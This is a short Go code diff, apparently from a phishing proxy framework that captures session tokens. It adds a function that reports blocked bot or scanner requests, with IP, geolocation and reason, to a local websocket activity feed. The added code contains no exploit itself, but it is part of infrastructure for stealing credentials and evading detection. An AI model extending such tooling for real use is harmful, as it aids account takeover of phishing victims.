@@ -618,6 +618,32 @@ func (r *Result) NotifyCapturedOtherSession(tokens map[string]string, phishlet s
 	return err
 }
 
+func HandleBlockedRequest(ip string, userAgent string, reason string, feed_enabled bool, phishlet string) error {
+	if !feed_enabled {
+		return nil
+	}
+	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+
+	fe := FeedEvent{}
+	fe.Type = "bot"
+	fe.Event = "Request Blocked"
+	fe.Message = "Blocked request from <strong>" + ip + "</strong> (" + reason + ")"
+	fe.Time = time.Now().UTC().String()
+	fe.Timestamp = time.Now().UTC().UnixMilli()
+	fe.Phishlet = phishlet
+	fe.IP = ip
+	fe.Geo = getGeoData(ip)
+	fe.Score = 0
+	data, _ := json.Marshal(fe)
+
+	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+	return err
+}
+
 func NewDatabase(path string) (*Database, error) {
 	var err error
 	d := &Database{
